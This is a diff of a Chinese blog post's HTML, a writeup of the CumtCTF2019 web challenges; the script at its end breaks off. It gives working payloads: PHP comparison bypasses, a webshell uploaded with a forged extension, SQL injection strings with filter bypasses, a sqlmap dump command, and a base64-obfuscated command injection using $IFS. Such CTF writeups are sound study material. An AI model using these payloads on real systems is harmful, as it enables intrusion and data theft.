@@ -1,66 +1,125 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>CumtCTF2019Ⅱ——Writeup（Web详解） | Lethe | 忘川</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe's Blog">
-  <meta name="description" content="Lethe's Blog">
-  <script id="hexo-configurations">
-  var CONFIG = {
-    root: '/',
-    theme: 'lx',
-    version: '1.4.5',
-    localsearch:{
-      "enable": false,
-      "trigger": "auto",
-      "top_n_per_article": 1,
-      "unescape": false,
-      "preload": false
-      },
-    path: '-'
-  };
-</script>
+<html lang="">
 
-  <link rel="shortcut icon" href="/hacker.png">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.min.js"></script>
-  <script src="/js/jquery.jside.menu.js"></script>
-	<script>
-	$(document).ready(function(){
-	$(".menu-container").jSideMenu({
-	    jSidePosition: "position-right",
-	    jSideSticky: true,
-	    jSideSkin: "moonlit",
-	     });
-	}); 
-	</script>
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="Lethe&#39;s Blog">
+  <meta name="author" content="Lethe">
+  <meta name="keywords" content="Lethe&#39;s Blog">
+  <title>CumtCTF2019Ⅱ——Writeup（Web详解） ~ Lethe | 忘川</title>
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+  <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
   
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:300|Noto+Serif+SC&amp;display=swap">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  
+  <link rel="stylesheet" href="/css/main.css">
+
+  
 </head>
+
+
 <body>
-<div class="single">
-<div id="page">
-<div id="lx-aside" style="background-image: url(/images/page-cover.jpg)" data-stellar-background-ratio="0.5">
-  <div class="overlay">
-  <div class="page-title">
-    <div class="avatar"><a href="/"><img src="/images/2.jpg"></a></div>
-    <span>2019-03-03</span>
-    <h2>CumtCTF2019Ⅱ——Writeup（Web详解）</h2>
-    <div class="tags"><i class="fa fa-tag"></i><a class="tag-link" href="/tags/Writeup/">Writeup</a></div>
-    <div class="social-links">
-<a href="https://github.com/LetheSec" target="_blank"><i class="fa fa-github fa-fw"></i></a><a href="mailto:1013579926@qq.com"><i class="fa fa-envelope fa-fw"></i></a>
-</div></div>
-</div>
-</div>
-<div id="lx-main-content">
-  <div class="lx-post">
-    <div class="lx-entry padding">
-      <div>
-        <h4><span id="web1签到题">Web1：签到题</span></h4><p>1、打开题目，源码直接显示在网页上。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302192458801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="web1"></p>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe | 忘川</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              <p class="mt-3">Sunday, March 3rd 2019, 11:55 am</p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto">
+          <div class="markdown-body">
+            <h4><span id="web1签到题">Web1：签到题</span></h4><p>1、打开题目，源码直接显示在网页上。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302192458801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="web1"></p>
 <p>2、发现构造0ver、0ver1、0ver2即可，下面就进行代码审计：</p>
 <p>（1）首先构造 0ver，有以下三个条件：<br>① <code>ereg(&quot;^[0-9]+$&quot;, $a) === FALSE)</code>，即要进行一次或多次 0-9 数字正则表达式匹配<br>② <code>in_array($a,$white_list)</code>，即0ver 中要有 range（0，9）<br>③ <code>strlen($a)&gt;1</code>，即0ver 的长度要大于 1</p>
 <p>一开始以为要考ereg()截断漏洞，其实是in_array()松散比较，即<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var_dump(in_array(<span class="string">'b'</span>, <span class="keyword">array</span>(<span class="string">'a'</span>=&gt;<span class="keyword">true</span>))); </span><br><span class="line">返回值:<span class="keyword">true</span></span><br><span class="line"> </span><br><span class="line">var_dump(in_array(<span class="string">'01'</span>,<span class="keyword">array</span>(<span class="string">'1'</span>)));</span><br><span class="line">返回值也是:<span class="keyword">true</span></span><br></pre></td></tr></table></figure></p>
@@ -74,21 +133,21 @@
 <p>（2）构造 0ver1 和 0ver2，有以下条件：</p>
 <pre><code>md5($c) === md5($b) &amp;&amp; ($b !== $c)
 </code></pre><p>所以要构造 md5 相同，真值不同的两个参数，但注意这里 md5 用===判断，所以不能利用md5 开头是 0e 的字符串来绕过，但可以利用数组绕过。<br><strong>因此构造：0ver1[]=1&amp;0ver2[]=2</strong></p>
-<p>3、最终构造的payload为：<code>?0ver=01&amp;0ver1[]=1&amp;0ver2[]=2</code>，得到 flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303100623661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web2simpleupload签到">Web2：SimpleUpload签到</span></h4><p>1、只允许png/gif/jpg文件格式，查看源码，判断为前端验证，并且提示flag在当前目录的flag.php <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201142580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、上传后缀为png的一句话木马，BurpSuite抓包改后缀为php，拿到链接。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201312733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、用菜刀链接木马，根据提示在flag.php中找到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201335585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
-<h4><span id="web3小型线上赌场">Web3：小型线上赌场</span></h4><p>1、 这一题要求下注并猜测赚的钱，但是赔率没刷新或提交一次页面都会变化。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201610824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、根据题目及后续的hint可知存在vim备份文件泄露，<code>.index.swp</code>下载swp。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202053379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>3、在kali下面对得到的index.swp文件进行恢复，进入文件的目录后<code>vim -r index.swp</code>，得到源码。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202211400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、进行代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$invest = $_GET[<span class="string">'invest'</span>];  </span><br><span class="line">	$rand = rand(<span class="number">2</span>,<span class="number">50</span>);  </span><br><span class="line"></span><br><span class="line">	$len = strlen(trim($_GET[<span class="string">'invest'</span>]));	</span><br><span class="line">	<span class="comment">//除去空格后所传入'invest'的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//限制非数字和0</span></span><br><span class="line">	<span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	    <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">	        <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$money = number_format($invest*$rand);</span><br><span class="line">	<span class="comment">//number_format()函数通过千位分组来格式化数字,返回的是字符串</span></span><br><span class="line"></span><br><span class="line">	$money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">	<span class="comment">//再将上一步中格式化进去的逗号去掉，并用intval()函数用于获取变量的整数值</span></span><br><span class="line">	$guess = intval($_GET[<span class="string">'guess'</span>]); </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>最后的判断逻辑为：猜测的数(guess)与money相等，且money的长度与invest的长度相等。<br>问题出现在<code>intval()</code>函数上，关于此函数返回值如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203014110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>也就是说当传入<code>intval()</code>的参数足够大时，其返回值根据操作系统的不同，是固定的数值（32位：2147483647，64位：9223372036854775807），这一题也就是传入的invest的数足够大时，无论随机数是多少，经过<code>intval()</code>函数处理过的money的值均是不变的。</p>
-<p>这样思路也就很清楚了，只需将guess的值等于money的64位上限值，也就是9223372036854775807，invest的长度要等于money的长度（任意19位数字），即可得到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203942515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
+<p>3、最终构造的payload为：<code>?0ver=01&amp;0ver1[]=1&amp;0ver2[]=2</code>，得到 flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190303100623661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<h4><span id="web2simpleupload签到">Web2：SimpleUpload签到</span></h4><p>1、只允许png/gif/jpg文件格式，查看源码，判断为前端验证，并且提示flag在当前目录的flag.php <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201142580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2、上传后缀为png的一句话木马，BurpSuite抓包改后缀为php，拿到链接。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201312733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3、用菜刀链接木马，根据提示在flag.php中找到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201335585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<h4><span id="web3小型线上赌场">Web3：小型线上赌场</span></h4><p>1、 这一题要求下注并猜测赚的钱，但是赔率没刷新或提交一次页面都会变化。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302201610824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>2、根据题目及后续的hint可知存在vim备份文件泄露，<code>.index.swp</code>下载swp。<br> <img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202053379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>3、在kali下面对得到的index.swp文件进行恢复，进入文件的目录后<code>vim -r index.swp</code>，得到源码。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302202211400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>4、进行代码审计<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$invest = $_GET[<span class="string">'invest'</span>];  </span><br><span class="line">	$rand = rand(<span class="number">2</span>,<span class="number">50</span>);  </span><br><span class="line"></span><br><span class="line">	$len = strlen(trim($_GET[<span class="string">'invest'</span>]));	</span><br><span class="line">	<span class="comment">//除去空格后所传入'invest'的长度</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//限制非数字和0</span></span><br><span class="line">	<span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">	    <span class="keyword">if</span>(!is_numeric($value)||$value == <span class="string">'0'</span>)&#123;</span><br><span class="line">	        <span class="keyword">die</span>(<span class="string">'no no no!'</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$money = number_format($invest*$rand);</span><br><span class="line">	<span class="comment">//number_format()函数通过千位分组来格式化数字,返回的是字符串</span></span><br><span class="line"></span><br><span class="line">	$money = intval(str_replace(<span class="string">','</span>,<span class="string">''</span>,$money));</span><br><span class="line">	<span class="comment">//再将上一步中格式化进去的逗号去掉，并用intval()函数用于获取变量的整数值</span></span><br><span class="line">	$guess = intval($_GET[<span class="string">'guess'</span>]); </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($guess == $money &amp;&amp; strlen($money)===$len) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后的判断逻辑为：猜测的数(guess)与money相等，且money的长度与invest的长度相等。<br>问题出现在<code>intval()</code>函数上，关于此函数返回值如下：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203014110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>也就是说当传入<code>intval()</code>的参数足够大时，其返回值根据操作系统的不同，是固定的数值（32位：2147483647，64位：9223372036854775807），这一题也就是传入的invest的数足够大时，无论随机数是多少，经过<code>intval()</code>函数处理过的money的值均是不变的。</p>
+<p>这样思路也就很清楚了，只需将guess的值等于money的64位上限值，也就是9223372036854775807，invest的长度要等于money的长度（任意19位数字），即可得到flag。<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302203942515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
 <h4><span id="web4simplesqli">Web4：SimpleSQLi</span></h4><p>一道没有任何过滤的SQL注入题<br>（1）手工注入过程如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆表名</span><br><span class="line">?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())  --+</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210130304.png" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段名</span><br><span class="line">![?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flagishere&apos;)  --+](CumtCTF2019Ⅱ——Writeup（Web详解）/2019030220581225.png)</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210139384.png" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">?id=-1&apos; union select 1,2,(select flag from flagishere) --+</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210147697.png" alt="在这里插入图片描述"><br>（2）sqlmap注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security -T flagishere -C flag --dump</span><br></pre></td></tr></table></figure></p>
-<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213143188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
+<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210130304.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段名</span><br><span class="line">![?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flagishere&apos;)  --+](CumtCTF2019Ⅱ——Writeup（Web详解）/2019030220581225.png)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210139384.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段</span><br><span class="line">?id=-1&apos; union select 1,2,(select flag from flagishere) --+</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302210147697.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>（2）sqlmap注入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://bxs.cumt.edu.cn:30007/test/index.php?id=1&quot; -D security -T flagishere -C flag --dump</span><br></pre></td></tr></table></figure></p>
+<p><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213143188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
 <h4><span id="web5真的简单">Web5：真的简单。。</span></h4><p>（1）也是一道SQL注入题，但是过滤了 <code>union</code> 、<code>select</code>、<code>or</code>、<code>and</code>等关键词，可以通过<strong>双写绕过</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">爆表名(这里注意information中也包含&apos;or&apos;,所以也要双写&apos;or&apos;)</span><br><span class="line">?id=-1&apos; uniunionon seleselectct 1,2,(seleselectct group_concat(table_name) from infoorrmation_schema.tables where table_schema=database())  --+</span><br><span class="line"></span><br><span class="line">爆字段名</span><br><span class="line">?id=-1&apos; uniunionon seleselectct 1,2,(seleselectct group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag&apos;)  --+</span><br><span class="line"></span><br><span class="line">爆字段</span><br><span class="line">?id=-1&apos; uniunionon seleselectct 1,2,(seleselectct flag from flag) --+</span><br></pre></td></tr></table></figure></p>
-<p>最终得到：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302212017142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并没有直接爆出flag，看来不是一道简单的SQL注入题。</p>
+<p>最终得到：<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302212017142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>并没有直接爆出flag，看来不是一道简单的SQL注入题。</p>
 <p>（2）打开admin_08163314/exec.php页面，是后台命令执行。</p>
 <p>输入如下命令进行执行，即可获得flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`echo$IFS&quot;Y2F0IC9mbGFnXzMzMTQvZmxhZw==&quot;|base64$IFS-d`</span><br></pre></td></tr></table></figure></p>
-<p>(对命令执行的绕过方法还不太熟悉，题目不能复现了，等学习后再详细解释吧…)<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213050858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><br></p>
+<p>(对命令执行的绕过方法还不太熟悉，题目不能复现了，等学习后再详细解释吧…)<br><img src="/2019/03/03/CumtCTF2019Ⅱ——Writeup（Web详解）/20190302213050858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
 <h4><span id="web6simplesqli2">Web6：SimpleSQLi2</span></h4><p>（1）这还是一道SQL注入题，但是只会回显<code>Welcome to CUMTCTF&#39;2019~</code>和<code>NoNoNo~</code>两个页面，因此可以判断为SQL盲注。<br>（2）过滤方式和上一题差不多，但测试发现只要构造的payload里有含有空格，均返回<code>NoNoNo~</code>页面，所以判断空格被过滤了。<br>（3）关键词依旧可以通过双写绕过，空格可以通过<code>/**/</code>绕过，通过下面判断出为数字型注入，构造的代码可以直接执行。</p>
 <table>
 <thead>
@@ -125,7 +184,7 @@
 </tbody>
 </table>
 <p>知道过滤方式之后，就可以写脚本来爆破:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span 